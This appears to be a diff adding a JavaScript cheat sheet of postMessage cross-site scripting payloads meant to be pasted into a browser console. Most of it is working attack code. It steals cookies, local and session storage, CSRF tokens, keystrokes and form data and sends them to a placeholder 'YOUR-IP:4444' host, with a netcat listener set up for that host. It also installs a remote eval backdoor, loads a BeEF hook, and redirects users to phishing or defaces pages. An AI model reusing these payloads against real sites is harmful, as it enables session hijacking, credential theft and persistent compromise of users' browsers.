@@ -1,0 +1,131 @@
+// STEP 1: Find vulnerable message listeners
+getEventListeners(window).message.forEach(l => console.log(l.listener.toString()));
+
+// STEP 2: Test if origin validation exists
+window.postMessage('test', '*');
+
+// STEP 3: Send XSS payload
+window.postMessage({type:'execute', code:'alert(1)'}, '*');
+
+// STEP 4: Steal cookies (setup listener first: nc -lvp 4444)
+window.postMessage({type:'execute', code:'fetch("http://YOUR-IP:4444?c="+document.cookie)'}, '*');
+
+
+// ============= POSTMESSAGE XSS - F12 CONSOLE PAYLOADS =============
+
+// 1. BASIC DETECTION (Copy to F12 console)
+window.postMessage('hello', '*');
+window.postMessage({type:'test'}, '*');
+window.postMessage({type:'execute', code:'alert(1)'}, '*');
+
+// 2. FIND VULNERABLE LISTENERS (Recon)
+console.log(window._listeners || 'No listeners found');
+getEventListeners(window);
+
+// 3. TEST ALERT PAYLOADS
+window.postMessage({type:'execute', code:'alert("XSS Found!")'}, '*');
+window.postMessage({type:'execute', code:'console.log("PostMessage XSS Works!")'}, '*');
+window.postMessage({type:'render', html:'<img src=x onerror=alert(1)>'}, '*');
+window.postMessage({type:'eval', data:'alert(1)'}, '*');
+
+// 4. COOKIE STEALING
+window.postMessage({type:'execute', code:'fetch("http://YOUR-IP:4444?c="+document.cookie)'}, '*');
+window.postMessage({type:'execute', code:'new Image().src="http://YOUR-IP:4444?c="+document.cookie'}, '*');
+
+// 5. LOCAL STORAGE THEFT
+window.postMessage({type:'execute', code:'fetch("http://YOUR-IP:4444?ls="+JSON.stringify(localStorage))'}, '*');
+
+// 6. SESSION STORAGE THEFT
+window.postMessage({type:'execute', code:'fetch("http://YOUR-IP:4444?ss="+JSON.stringify(sessionStorage))'}, '*');
+
+// 7. FULL PAGE DATA EXFILTRATION
+window.postMessage({type:'execute', code:'fetch("http://YOUR-IP:4444?html="+btoa(document.documentElement.outerHTML))'}, '*');
+
+// 8. PAGE DEFACEMENT
+window.postMessage({type:'execute', code:'document.body.innerHTML="<h1 style=color:red>HACKED VIA POSTMESSAGE</h1>"'}, '*');
+window.postMessage({type:'render', html:'<div style="background:red;color:white;padding:20px">HACKED</div>'}, '*');
+
+// 9. REDIRECT TO PHISHING
+window.postMessage({type:'execute', code:'window.location="http://YOUR-IP:4444/phishing.html"'}, '*');
+
+// 10. PERMANENT BACKDOOR
+window.postMessage({type:'execute', code:'setInterval(()=>{fetch("http://YOUR-IP:4444/cmd").then(r=>r.text()).then(eval)},5000)'}, '*');
+
+// 11. KEYLOGGER
+window.postMessage({type:'execute', code:'let k="";document.onkeypress=e=>{k+=e.key;if(k.length>10){fetch("http://YOUR-IP:4444?k="+k);k=""}}'}, '*');
+
+// 12. FORM HIJACKING
+window.postMessage({type:'execute', code:'document.querySelectorAll("form").forEach(f=>{f.addEventListener("submit",e=>{let d=new FormData(f);fetch("http://YOUR-IP:4444/form",{method:"POST",body:JSON.stringify([...d])})})})'}, '*');
+
+// 13. BeEF HOOK
+window.postMessage({type:'execute', code:'var s=document.createElement("script");s.src="http://YOUR-IP:3000/hook.js";document.body.appendChild(s)'}, '*');
+
+// 14. CRYPTO MINER (CPU Hijack)
+window.postMessage({type:'execute', code:'setInterval(()=>{for(let i=0;i<1000000;i++)Math.random()},100)'}, '*');
+
+// 15. CSRF TOKEN STEALER
+window.postMessage({type:'execute', code:'let t=document.querySelector("meta[name=csrf-token]");if(t)fetch("http://YOUR-IP:4444?csrf="+t.content)'}, '*');
+
+// 16. VISUAL CONFIRMATION (Title & Color Change)
+window.postMessage({type:'execute', code:'document.title="HACKED";document.body.style.backgroundColor="red"'}, '*');
+
+// 17. SCREENSHOT (DOM to Image)
+window.postMessage({type:'execute', code:'var s=document.createElement("script");s.src="https://html2canvas.hertzen.com/dist/html2canvas.min.js";s.onload=()=>{html2canvas(document.body).then(c=>{fetch("http://YOUR-IP:4444/screenshot",{method:"POST",body:c.toDataURL()})})};document.head.appendChild(s)'}, '*');
+
+// 18. CONSOLE LOG VERIFICATION
+window.postMessage({type:'execute', code:'console.log("%c🔥 PostMessage XSS Successful! 🔥","color:red;font-size:20px")'}, '*');
+
+// 19. MULTIPLE PAYLOADS (One Liner Attack)
+setTimeout(()=>{
+    window.postMessage({type:'execute', code:'alert("XSS Found!")'}, '*');
+    window.postMessage({type:'execute', code:'fetch("http://YOUR-IP:4444?c="+document.cookie)'}, '*');
+    window.postMessage({type:'execute', code:'document.body.style.backgroundColor="red"'}, '*');
+}, 1000);
+
+// 20. AUTO-DETECT & EXPLOIT (Smart Payload)
+(function() {
+    let xssPayload = 'alert("PostMessage XSS Vulnerable!")';
+    window.postMessage({type:'execute', code:xssPayload}, '*');
+    window.postMessage({type:'eval', data:xssPayload}, '*');
+    window.postMessage({type:'callback', fn:xssPayload}, '*');
+    console.log('✅ PostMessage XSS test sent! Check for alert.');
+})();
+
+// 21. IFRAME TARGET EXPLOIT
+var iframe = document.createElement('iframe');
+iframe.src = 'http://target.com/embed';
+document.body.appendChild(iframe);
+setTimeout(() => {
+    iframe.contentWindow.postMessage({type:'execute', code:'alert("XSS via iframe")'}, '*');
+}, 2000);
+
+// 22. WILDCARD ORIGIN BYPASS
+window.postMessage({type:'execute', code:'alert(1)'}, 'http://target.com');
+window.postMessage({type:'execute', code:'alert(1)'}, window.location.origin);
+
+// 23. EVENT LISTENER INJECTION (Create new listener)
+window.addEventListener('message', function(e) {
+    if(e.data && e.data.cmd) eval(e.data.cmd);
+    console.log('Custom listener installed:', e.data);
+}, false);
+
+// 24. SELF-XSS TEST (If you control the page)
+window.onmessage = function(e) { eval(e.data); };
+window.postMessage('alert("Self XSS")', '*');
+
+// 25. MEGA ALL-IN-ONE PAYLOAD
+window.postMessage({type:'execute', code:`
+    fetch('http://YOUR-IP:4444?c='+document.cookie);
+    fetch('http://YOUR-IP:4444?ls='+JSON.stringify(localStorage));
+    let k='';document.onkeypress=e=>{k+=e.key;if(k.length>10){fetch('http://YOUR-IP:4444?k='+k);k=''}};
+    setInterval(()=>{fetch('http://YOUR-IP:4444/cmd').then(r=>r.text()).then(eval)},5000);
+    document.body.innerHTML='<h1 style=color:red>HACKED</h1>';
+    console.log('%c🔥 ALL EXPLOITS DEPLOYED! 🔥','color:red;font-size:20px');
+`}, '*');
+
+// ============= QUICK TEST (One Line - Copy Paste) =============
+window.postMessage({type:'execute', code:'alert("PostMessage XSS Works!")'}, '*');
+
+// ============= WITH LISTENER SETUP (Complete Attack) =============
+// Terminal: nc -lvp 4444
+window.postMessage({type:'execute', code:'fetch("http://YOUR-IP:4444?cookie="+document.cookie)'}, '*');
